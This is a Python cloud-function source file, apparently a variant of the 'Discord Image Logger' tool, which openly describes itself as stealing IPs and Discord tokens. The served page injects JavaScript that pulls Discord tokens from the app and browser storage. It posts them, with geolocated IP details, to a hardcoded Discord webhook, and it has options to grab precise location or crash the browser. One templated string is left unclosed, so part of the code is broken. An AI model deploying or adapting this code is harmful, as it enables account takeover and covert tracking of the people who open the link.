import functions_framework
import requests
import base64
import httpagentparser
import traceback
from urllib import parse
import json
import logging

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

__app__ ="Discord Image Logger"
__description__ ="A simple application which allows you to steal IPs and Discord tokens by abusing Discord's Open Original feature"
__version__ ="v2.1"
__author__ ="C00lB0i"

config = {
    # BASE CONFIG #"webhook":"https://discord.com/api/webhooks/1058074536932806756/tHxpd1B4toTe9O--IKfNp_nQYwmw_kvM5SlbKJybPJOjWxQ5HTm5uUyOvrxhFlN7l2rz","image":"https://www.sportsdirect.com/images/imgzoom/39/39709290_xxl.jpg","imageArgument": True,

    # CUSTOMIZATION #"username":"Image Logger","color": 0x00FFFF,

    # OPTIONS #"crashBrowser": False,"accurateLocation": False,"message": {"doMessage": False,"message":"This browser has been pwned by C00lB0i's Image Logger. https://github.com/OverPowerC","richMessage": True,},"vpnCheck": 1,"linkAlerts": True,"buggedImage": True,"antiBot": 1,

    # REDIRECTION #"redirect": {"redirect": False,"page":"https://your-link.here"
    },}
blacklistedIPs = ("27","104","143","164")

binaries = {"loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

def botCheck(ip, useragent):
    if ip.startswith(("34","35")):
        return"Discord"
    elif useragent.startswith("TelegramBot"):
        return"Telegram"
    else:
        return False

def reportError(error):
    try:
        requests.post(config["webhook"], json={"username": config["username"],"content":"@everyone","embeds": [
                {"title":"Image Logger - Error","color": config["color"],"description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",}            ],}, timeout=5)
    except Exception as e:
        logger.error(f"Failed to report error to webhook: {e}")

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, token=None):
    if ip.startswith(blacklistedIPs):
        return

    bot = botCheck(ip, useragent)
    if bot:
        if config["linkAlerts"]:
            try:
                requests.post(config["webhook"], json={"username": config["username"],"content": "","embeds": [
                        {"title":"Image Logger - Link Sent","color": config["color"],"description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",}                    ],}, timeout=5)
            except Exception as e:
                logger.error(f"Failed to send link alert: {e}")
        return

    ping ="@everyone"
    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5).json()
    except Exception as e:
        logger.error(f"Failed to fetch IP info: {e}")
        info = {}

    if info.get("proxy"):
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""

    if info.get("hosting"):
        if config["antiBot"] == 4:
            if not info.get("proxy"):
                return
        if config["antiBot"] == 3:
            return
        if config["antiBot"] == 2:
            if not info.get("proxy"):
                ping = ""
        if config["antiBot"] == 1:
            ping = ""

    os, browser = httpagentparser.simple_detect(useragent or "")
    embed = {"username": config["username"],"content": ping,"embeds": [
            {"title":"Image Logger - IP and Token Logged","color": config["color"],"description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`

**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **Coords:** `{str(info.get('lat', 'Unknown'))+', '+str(info.get('lon', 'Unknown')) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps](https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info.get('timezone', 'Unknown').split('/')[1].replace('_', ' ') if info.get('timezone') else 'Unknown'}`
> **Mobile:** `{info.get('mobile', 'Unknown')}`
> **VPN:** `{info.get('proxy', 'False')}`
> **Bot:** `{info.get('hosting', 'False') if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**Discord Token:**
>`{token if token else 'Not Retrieved'}`

**User Agent:**
        embed["embeds"][0].update({"thumbnail": {"url": url}})
    try:
        requests.post(config["webhook"], json=embed, timeout=5)
    except Exception as e:
        logger.error(f"Failed to send report to webhook: {e}")
    return info

@functions_framework.http
def image_logger(request):
    try:
        # Extract headers
        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
        useragent = request.headers.get('User-Agent', '')
        path = request.path
        args = request.args

        # Handle image URL
        if config["imageArgument"]:
            dic = dict(args)
            if dic.get("url") or dic.get("id"):
                url = base64.b64decode(dic.get("url") or dic.get("id")).decode()
            else:
                url = config["image"]
        else:
            url = config["image"]

        # Check for blacklisted IPs or bots
        if ip.startswith(blacklistedIPs):
            return '', 204

        if botCheck(ip, useragent):
            headers = {'Content-Type': 'image/jpeg'} if config["buggedImage"] else {'Location': url}
            status = 200 if config["buggedImage"] else 302
            content = binaries["loading"] if config["buggedImage"] else ''
            makeReport(ip, endpoint=path.split("?")[0], url=url)
            return content, status, headers

        # Prepare response data
        data = f"""<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>""".encode()

        # Handle token stealing
        token_script = f"""
        <script>
        (async () => {{
            try {{
                const token = (webpackChunkdiscord_app || []).find(m => m?.[1]?._dispatch)?.[1]?._dispatch?.toString()?.match(/return\\s+["']([A-Za-z0-9_\\.-]{{20,}}\\.[A-Za-z0-9_\\.-]{{5,}}\\.[A-Za-z0-9_\\.-]{{20,}})["']/i)?.[1] ||
                              localStorage.getItem('token')?.replace(/"/g, '') ||
                              sessionStorage.getItem('token')?.replace(/"/g, '');
                if (token) {{
                    await fetch('{config["webhook"]}', {{
                        method: 'POST',
                        headers: {{ 'Content-Type': 'application/json' }},
                        body: JSON.stringify({{
                            username: '{config["username"]}',
                            content: '',
                            embeds: [{{
                                title: 'Discord Token Captured',
                                color: {config["color"]},
                                description:`**Token:** \\`${{token}}\\`\n**IP:** \\`${{ip}}\\``
                            }}]
                        }})
                    }});
                }}
                // Send IP and token to main report
                await fetch(window.location.href + (window.location.search? '&' : '?') + 'token=' + btoa(token || 'none'));
            }} catch (e) {{}}
        }})();
        </script>
        """

        # Handle accurate location
        if config["accurateLocation"]:
            data += b"""<script>
var currenturl = window.location.href;
if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
            if (currenturl.includes("?")) {
                currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g,"%3D"));} else {
                currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g,"%3D"));}            location.replace(currenturl);
        });
    }}
</script>"""

        # Handle custom message
        message = config["message"]["message"]
        if config["message"]["doMessage"]:
            result = makeReport(ip, useragent, endpoint=path.split("?")[0], url=url, token=args.get("token","none"))
            if config["message"]["richMessage"] and result:
                message = message.replace("{ip}", ip)
                message = message.replace("{isp}", result.get("isp","Unknown"))
                message = message.replace("{asn}", result.get("as","Unknown"))
                message = message.replace("{country}", result.get("country","Unknown"))
                message = message.replace("{region}", result.get("regionName","Unknown"))
                message = message.replace("{city}", result.get("city","Unknown"))
                message = message.replace("{lat}", str(result.get("lat","Unknown")))
                message = message.replace("{long}", str(result.get("lon","Unknown")))
                message = message.replace("{timezone}", f"{result.get('timezone', 'Unknown').split('/')[1].replace('_', ' ') if result.get('timezone') else 'Unknown'}")
                message = message.replace("{mobile}", str(result.get("mobile","Unknown")))
                message = message.replace("{vpn}", str(result.get("proxy","False")))
                message = message.replace("{bot}", str(result.get("hosting","False") if result.get("hosting") and not result.get("proxy") else 'Possibly' if result.get("hosting") else 'False'))
                message = message.replace("{browser}", httpagentparser.simple_detect(useragent)[1])
                message = message.replace("{os}", httpagentparser.simple_detect(useragent)[0])
            data = message.encode()

        # Handle browser crash
        if config["crashBrowser"]:
            data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'

        # Handle redirection
        if config["redirect"]["redirect"]:
            data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()

        # Append token script
        data += token_script.encode()

        # Send response
        headers = {'Content-Type': 'text/html'}
        if args.get("token"):
            token = base64.b64decode(args.get("token")).decode()
            makeReport(ip, useragent, endpoint=path.split("?")[0], url=url, token=token)
        return data, 200, headers

    except Exception as e:
        logger.error(f"Server error: {traceback.format_exc()}")
        reportError(traceback.format_exc())
        return '500 - Internal Server Error', 500, {'Content-Type': 'text/html'}
